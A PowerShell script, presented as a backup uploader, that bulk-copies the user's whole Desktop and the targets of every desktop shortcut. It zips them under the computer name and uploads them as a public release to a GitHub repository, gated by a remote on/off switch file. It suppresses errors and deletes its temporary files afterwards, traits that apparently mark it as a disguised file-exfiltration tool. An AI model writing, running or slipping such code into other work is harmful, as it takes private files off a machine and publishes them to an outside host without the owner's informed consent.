# uploader.ps1 - 上传桌面内容 + 快捷方式目标路径 + GitHub Switch 控制

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
if (-not $token) {
    Write-Host "❌ GH_TOKEN 环境变量未设置，脚本终止。"
    exit 1
}

# 远程开关控制
$switchUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-switch.txt"
try {
    $switch = (Invoke-RestMethod -Uri $switchUrl -UseBasicParsing -ErrorAction Stop).Trim().ToLower()
    if ($switch -ne "on") {
        Write-Host "🔕 上传开关关闭，终止上传。"
        exit 0
    }
    Write-Host "🔔 上传开关已开启，继续执行任务..."
} catch {
    Write-Warning "⚠️ 无法获取上传开关状态，终止。"
    exit 1
}

# 临时工作目录
$tag = "$env:COMPUTERNAME-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$workDir = "$env:TEMP\backup_$tag"
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# STEP 1: 复制整个桌面内容
$desktopPath = [Environment]::GetFolderPath("Desktop")
$desktopDest = Join-Path $workDir "Desktop"
Copy-Item $desktopPath -Destination $desktopDest -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "📁 已复制桌面内容到临时目录"

# STEP 2: 提取所有 .lnk 快捷方式的“目标路径”，并尝试复制目标
$lnkFiles = Get-ChildItem -Path $desktopPath -Filter *.lnk -ErrorAction SilentlyContinue
$lnkReport = ""
$shortcutDestRoot = Join-Path $workDir "ShortcutTargets"
$index = 0

foreach ($lnk in $lnkFiles) {
    try {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnk.FullName)

        $targetPath = $shortcut.TargetPath
        if ([string]::IsNullOrWhiteSpace($targetPath)) { continue }

        $lnkReport += "[$($lnk.Name)]`nTarget: $targetPath`n---`n"

        if (Test-Path $targetPath) {
            $index++
            $shortcutDest = Join-Path $shortcutDestRoot "item$index"
            Copy-Item $targetPath -Destination $shortcutDest -Recurse -Force -ErrorAction SilentlyContinue
        }
    } catch {
        continue
    }
}

# 保存快捷方式路径报告
if ($lnkReport) {
    $reportFile = Join-Path $workDir "shortcut_report.txt"
    $lnkReport | Out-File -FilePath $reportFile -Encoding UTF8
}

# STEP 3: 压缩
$zipPath = "$env:TEMP\$tag.zip"
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force
Write-Host "🗜️ 已压缩为 $zipPath"

# STEP 4: 上传到 GitHub Release
$apiUrl = "https://api.github.com/repos/$repo/releases"
$releaseInfo = @{
    tag_name   = $tag
    name       = "Backup $tag"
    body       = "桌面与快捷方式目标备份"
    draft      = $false
    prerelease = $false
} | ConvertTo-Json -Depth 3

$headers = @{
    Authorization = "token $token"
    "Content-Type" = "application/json"
}

try {
    $release = Invoke-RestMethod -Uri $apiUrl -Headers $headers -Method POST -Body $releaseInfo
    $uploadUrl = $release.upload_url -replace "{.*}", "?name=$(Split-Path $zipPath -Leaf)"

    $uploadHeaders = @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
    }

    Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers $uploadHeaders -InFile $zipPath
    Write-Host "`n✅ 上传成功：$tag.zip"
} catch {
    Write-Warning "❌ 上传失败：$($_.Exception.Message)"
}

# STEP 5: 清理
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
